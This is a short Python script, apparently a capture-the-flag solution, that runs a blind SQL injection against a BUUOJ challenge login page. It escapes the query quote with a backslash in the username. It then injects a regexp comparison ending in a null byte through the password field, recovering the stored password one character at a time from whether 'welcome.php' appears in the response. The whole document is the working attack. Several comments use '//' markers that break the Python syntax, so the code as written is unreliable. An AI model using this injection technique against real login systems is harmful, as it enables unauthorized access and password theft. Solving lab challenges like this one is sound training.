import requests
from urllib import parse
s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&(),-./:;<=>@[\]_`{|}~' //定义字符集
flag=''
url="""http://7103ed02-f685-4725-a737-f6be19e1d1ea.node3.buuoj.cn/index.php"""       //定义url

for i in range(100):
    for j in s:
        //定义post请求体（键值对）
        data = {"username": "\\",
                "passwd":"||passwd/**/regexp/**/\"^{}\";{}".format((flag+j),parse.unquote('%00'))
                }
        # 注意再写python的时候传入%00不能直接传入,直接传会解码直接为空
        //向url发送post请求
        res = requests.post(url=url,data=data)
        //判断welcome.php在不在响应体里面
        if "welcome.php" in res.text:
            flag=flag+j 
            print(flag)
            break
print(flag)
